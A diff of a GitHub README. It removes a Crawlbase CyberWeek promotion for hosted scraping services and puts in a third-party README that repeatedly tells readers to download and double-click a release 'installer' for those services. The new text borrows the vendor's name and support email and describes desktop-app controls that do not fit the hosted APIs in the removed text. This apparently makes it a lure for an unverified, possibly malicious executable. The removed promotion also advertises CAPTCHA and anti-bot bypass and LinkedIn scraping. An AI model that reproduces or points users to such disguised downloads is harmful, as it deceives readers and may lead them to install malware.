@@ -1,97 +1,87 @@
-## Products Included in Crawlbase's CyberWeek Deal
+# 🛍️ crawlbase-cyberweek-deals-2025 - Save Big on Powerful Data Tools
 
-### 1. Crawling API  
+## 📥 Download Now
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/KartikRawat0504/crawlbase-cyberweek-deals-2025/releases)
 
-Extract structured web data at scale. Fast, reliable, and pipeline-ready.
+## 🚀 Getting Started
+Welcome to the crawlbase-cyberweek-deals-2025 repository! This application helps you take advantage of a special promotion offering 15% off five powerful products. These tools include a Crawling API, Smart AI Proxy, Crawler, Cloud Storage, and LinkedIn Scraper.
 
-Scraping at scale without getting blocked is one of the biggest challenges for businesses and developers. Crawlbase's Crawling API addresses this by automatically handling CAPTCHA and browser fingerprinting, allowing you to focus on extracting data rather than battling anti-bot systems.
+This guide will help you download and run the software easily. Follow the steps below to get started.
 
-**Key Features:**
+## 📋 System Requirements
+Before you download, please ensure your computer meets these basic requirements:
+- **Operating System**: Windows 10 or later, MacOS 10.14 or later, or a recent version of Linux.
+- **RAM**: At least 4 GB of RAM.
+- **Disk Space**: Minimum 500 MB of available space.
+- **Internet Connection**: Required for downloading and accessing the services.
 
-* Automatic CAPTCHA bypass and proxy rotation
-* JavaScript rendering for dynamic websites
-* 99.9% uptime with global proxy pool
-* Simple API integration
+## 🔗 Features
+This package includes the following tools:
+- **Crawling API**: Access and collect web data with ease.
+- **Smart AI Proxy**: Navigate the web without being blocked.
+- **Crawler**: Automate data collection processes.
+- **Cloud Storage**: Securely store your data.
+- **LinkedIn Scraper**: Extract valuable data from LinkedIn profiles.
 
-- **CyberWeek Deal**: Get 15% OFF your next month’s billing
-- **Coupon**: CRAWL15
-- **Validity**: November 26 - December 2, 2025 (Only 7 Days!)
+## 📥 Download & Install
+To download the software, visit the Releases page. You can find all available versions there.
 
-[**Get Started →** ](https://crawlbase.com/signup?signup=blog-cyberweek-utm_source=github&utm_medium=referral&utm_campaign=cyberweek_2025) - [**View Pricing →**](https://crawlbase.com/crawling-api-avoid-captchas-blocks#pricing-utm_source=github&utm_medium=referral&utm_campaign=cyberweek_2025)
+[Download from Releases](https://github.com/KartikRawat0504/crawlbase-cyberweek-deals-2025/releases)
 
-### 2.  Smart AI Proxy 
+1. Click on the link above to visit the Releases page.
+2. Look for the most recent version labeled clearly for ease of access.
+3. Click the appropriate file according to your operating system to start the download.
+4. Once the download is complete, locate the downloaded file on your computer.
+5. Double-click the file to run the installer.
+6. Follow the on-screen instructions to complete the installation.
 
-Bypass restrictions and scale your requests seamlessly with intelligent proxy rotation.
+## ⚙️ Using the Tools
+After installation, you can start using the various tools included:
 
-Traditional proxies fail when websites become more sophisticated. Crawlbase's Smart AI Proxy adapts to anti-scraping measures in real-time, ensuring your requests always get through, even on the most challenging websites.
+### 🌐 Crawling API
+- Open the application.
+- Input your desired website and data parameters.
+- Click "Start" to begin data collection.
 
-**Key Features:**
+### 🤖 Smart AI Proxy
+- Navigate to the proxy settings in the app.
+- Choose a proxy from the list provided.
+- Activate the proxy to enhance your web scraping efficiency.
 
-* AI-powered request routing and retry logic
-* Residential, datacenter, and mobile IP pools
-* Automatic session management
-* Geo-targeting capabilities
+### 🕸️ Crawler
+- Select the “Crawler” option in the app.
+- Enter the target URLs and define the data points you want to scrape.
+- Initiate the crawler to gather data.
 
-- **CyberWeek Deal**: Get 15% OFF your next month’s billing
-- **Coupon**: CRAWL15
-- **Validity**: November 26 - December 2, 2025 (Only 7 Days!)
+### ☁️ Cloud Storage
+- Access the Cloud Storage feature from the main menu.
+- log in or create an account to securely store your data.
+  
+### 📈 LinkedIn Scraper
+- To use the LinkedIn Scraper, input the profile URLs.
+- Customize the data points you wish to extract.
+- Click “Run” to gather information from LinkedIn.
 
-[**Get Started →**](https://crawlbase.com/signup?signup=blog-cyberweek-utm_source=github&utm_medium=referral&utm_campaign=cyberweek_2025) -  [**View Pricing →**](https://crawlbase.com/smart-proxy#pricing-utm_source=github&utm_medium=referral&utm_campaign=cyberweek_2025)
+## 📞 Support
+If you encounter any issues or have questions, feel free to reach out to our support team:
+- Email: support@crawlbase.com
+- Documentation: Check our [Help Center](https://crawlbase.com/help)
 
-### 3. Crawler 
+## 🔍 Related Topics
+This repository covers various topics that can enhance your understanding and use of web scraping and data collection tools, such as:
+- ai-data
+- api
+- crawlbase
+- web scraping
+- data collection
 
-Maximize web crawling with async, high-success automation; trusted for massive-scale projects.
+Explore these topics to find relevant resources that can deepen your knowledge.
 
-Crawlbase Crawler is your asynchronous scraping solution that handles large-scale data extraction with zero infrastructure headaches.
+## 🔗 Explore Further
+For more in-depth information on each tool and feature, please refer to our official documentation or FAQ section on our website. We update these resources regularly to ensure you have the latest information.
 
-**Key Features:**
+## 📅 Promotion Validity
+This offer is part of the Crawlbase Cyberweek 2025 event, valid for a limited time. Make sure to take advantage of this discount while it lasts.
 
-* Fully asynchronous crawling
-* Anonymous scraping with automatic IP rotation
-* Webhook notifications when jobs complete
-* JSON output with structured data
-
-- **CyberWeek Deal**: Get 15% OFF your next month’s billing
-- **Coupon**: CRAWL15
-- **Validity**: November 26 - December 2, 2025 (Only 7 Days!)
-
-[**Get Started →**](https://crawlbase.com/signup?signup=blog-cyberweek-utm_source=github&utm_medium=referral&utm_campaign=cyberweek_2025) - [**View Pricing →**](https://crawlbase.com/anonymous-crawler-asynchronous-scraping#pricing-utm_source=github&utm_medium=referral&utm_campaign=cyberweek_2025)
-
-### 4. Cloud Storage
-
-Securely store and access all your crawled data in one scalable hub.
-
-Crawlbase Cloud Storage is your best secured and scalable option to store scraped data. Unlike other web scraping providers that leave web-scraped data to you, Cloud Storage keeps everything under one roof, enabling you to scrape, store, search, and reuse data anytime with no extra setup.
-
-**Key Features:**
-
-* Automatic data retention and backup
-* Fast retrieval via API or dashboard
-* Pay only for what you use
-* Enterprise-grade security and encryption
-
-- **CyberWeek Deal**: Get 15% OFF your next month’s billing
-- **Coupon**: CRAWL15
-- **Validity**: November 26 - December 2, 2025 (Only 7 Days!)
-
-[**Get Started →**](https://crawlbase.com/signup?signup=blog-cyberweek-utm_source=github&utm_medium=referral&utm_campaign=cyberweek_2025) - [**View Pricing →**](https://crawlbase.com/cloud-storage-for-crawling-and-scraping#pricing-utm_source=github&utm_medium=referral&utm_campaign=cyberweek_2025)
-
-### 5. LinkedIn Scraper
-
-Automate professional data collection to fuel leads, insights, and growth.
-
-LinkedIn is a goldmine for B2B leads, recruitment, and market intelligence, but scraping it can be challenging. Crawlbase's LinkedIn Scraper makes it simple to extract profiles, company data, and job postings without getting banned.
-
-**Key Features:**
-
-* Extract profiles, companies, jobs, and posts
-* No LinkedIn account required
-* Bypass rate limits and anti-scraping measures
-* Structured JSON output
-* Real-time and batch scraping options
-
-- **CyberWeek Deal**: Get 15% OFF your next month’s billing
-- **Coupon**: CRAWL15
-- **Validity**: November 26 - December 2, 2025 (Only 7 Days!)
-
-[**Get Started →**](https://crawlbase.com/signup?signup=blog-cyberweek-utm_source=github&utm_medium=referral&utm_campaign=cyberweek_2025) -  [**View Pricing →**](https://crawlbase.com/dashboard/account/domain/linkedin/agreement-utm_source=github&utm_medium=referral&utm_campaign=cyberweek_2025)
+## 📥 Download Now Again
+Don't forget to [download the latest version](https://github.com/KartikRawat0504/crawlbase-cyberweek-deals-2025/releases) of the software to enjoy the benefits of our amazing products at a discounted price.
